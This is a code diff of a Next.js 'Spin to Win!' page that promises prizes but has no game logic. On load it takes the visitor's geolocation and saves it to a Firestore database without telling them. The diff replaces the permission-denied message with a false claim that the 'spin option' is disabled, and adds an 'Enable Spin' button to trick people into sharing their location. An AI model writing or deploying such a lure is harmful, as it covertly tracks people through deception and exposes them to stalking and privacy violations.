@@ -2,82 +2,138 @@ import Head from 'next/head'
 import { useEffect, useState } from 'react'
 import { db } from '@/lib/firebase'
 import { collection, addDoc, Timestamp } from 'firebase/firestore'
+import { Box, Button, Alert, Typography } from '@mui/material'
 
 export default function Home() {
-  const [location, setLocation] = useState<{ lat: number; lng: number } | null>(null)
-  const [error, setError] = useState<string | null>(null)
-  const [saved, setSaved] = useState(false)
-  const [retry, setRetry] = useState(false)
+  const [location, setLocation] = useState<{ lat: number; lng: number } | null>(
+    null
+  );
+  const [error, setError] = useState<string | null>(null);
+  const [saved, setSaved] = useState(false);
+  const [showEnableButton, setShowEnableButton] = useState(false);
 
   const requestLocation = () => {
     if (!navigator.geolocation) {
-      setError('Geolocation is not supported by your browser')
-      return
+      setError("Geolocation is not supported by your browser");
+      return;
     }
 
     navigator.geolocation.getCurrentPosition(
       async (position) => {
-        const lat = position.coords.latitude
-        const lng = position.coords.longitude
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
 
-        setLocation({ lat, lng })
-        setError(null)
+        setLocation({ lat, lng });
+        setError(null);
+        setShowEnableButton(false);
 
         try {
-          await addDoc(collection(db, 'locations'), {
+          await addDoc(collection(db, "locations"), {
             lat,
             lng,
             timestamp: Timestamp.now(),
-          })
-          setSaved(true)
+          });
+          setSaved(true);
         } catch (err: any) {
-          setError('Failed to save to Firestore: ' + err.message)
+          setError("Failed to save to Firestore: " + err.message);
         }
       },
       (err) => {
-        setError('Location permission denied. Please allow location access.')
-        setRetry(true)
+        setError(
+          "Spin option disabled please enable it by clicking the below button."
+        );
+        setShowEnableButton(true);
       }
-    )
-  }
+    );
+  };
 
+  // 🔄 Try to get location on first load
   useEffect(() => {
-    requestLocation()
-  }, [])
+    requestLocation();
+  }, []);
 
   return (
     <>
       <Head>
         <title>🎯 Spin to Win!</title>
-        <meta name="description" content="Try your luck and win exciting prizes 🎁" />
-
-        {/* ✅ Open Graph Meta Tags */}
+        <meta
+          name="description"
+          content="Try your luck and win exciting prizes 🎁"
+        />
         <meta property="og:title" content="🎯 Spin to Win!" />
-        <meta property="og:description" content="Try your luck and win exciting prizes 🎁" />
+        <meta
+          property="og:description"
+          content="Try your luck and win exciting prizes 🎁"
+        />
         <meta property="og:type" content="website" />
-        <meta property="og:image" content="https://spin-win-gamma.vercel.app/spin.png" />
+        <meta
+          property="og:image"
+          content="https://spin-win-gamma.vercel.app/spin.png"
+        />
         <meta property="og:url" content="https://spin-win-gamma.vercel.app" />
-
-        {/* ✅ Twitter Card Tags */}
         <meta name="twitter:card" content="summary_large_image" />
         <meta name="twitter:title" content="🎯 Spin to Win!" />
-        <meta name="twitter:description" content="Try your luck and win exciting prizes 🎁" />
-        <meta name="twitter:image" content="https://spin-win-gamma.vercel.app/spin.png" />
+        <meta
+          name="twitter:description"
+          content="Try your luck and win exciting prizes 🎁"
+        />
+        <meta
+          name="twitter:image"
+          content="https://spin-win-gamma.vercel.app/spin.png"
+        />
       </Head>
 
-      <main className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-[#fff1eb] to-[#fddcdc] text-center px-4">
-        <h1 className="text-5xl font-extrabold text-[#ff4d4f] mb-10 drop-shadow-lg tracking-wide">
+      <Box
+        minHeight="100vh"
+        display="flex"
+        flexDirection="column"
+        alignItems="center"
+        justifyContent="center"
+        bgcolor="linear-gradient(to bottom right, #fff1eb, #fddcdc)"
+        textAlign="center"
+        px={2}
+      >
+        <Typography variant="h3" component="h1" fontWeight="bold" color="error" gutterBottom>
           🎯 Spin to Win!
-        </h1>
+        </Typography>
 
-        <div className="w-80 h-80 flex items-center justify-center bg-white rounded-full shadow-2xl border-[10px] border-[#ffb3af]">
+        <Box
+          width={300}
+          height={300}
+          display="flex"
+          alignItems="center"
+          justifyContent="center"
+          bgcolor="#fff"
+          border="8px solid #ffb3af"
+          borderRadius="50%"
+          boxShadow={3}
+          mb={3}
+        >
           <img
             src="/spin.png"
             alt="Spin Wheel"
-            className="w-60 h-60 object-contain transition-transform duration-700 ease-in-out hover:rotate-[360deg]"
+            style={{ width: '80%', height: '80%', objectFit: 'contain' }}
           />
-        </div>
-      </main>
+        </Box>
+
+        {error && (
+          <Alert severity="error" sx={{ mt: 2, maxWidth: 400 }}>
+            {error}
+          </Alert>
+        )}
+
+        {showEnableButton && (
+          <Button
+            onClick={requestLocation}
+            variant="contained"
+            color="error"
+            size="large"
+            sx={{ mt: 3, px: 4, py: 1.5, fontWeight: 'bold', borderRadius: 8 }}
+          >
+            🔓 Enable Spin
+          </Button>
+        )}
+      </Box>
     </>
-  )
+  );
 }
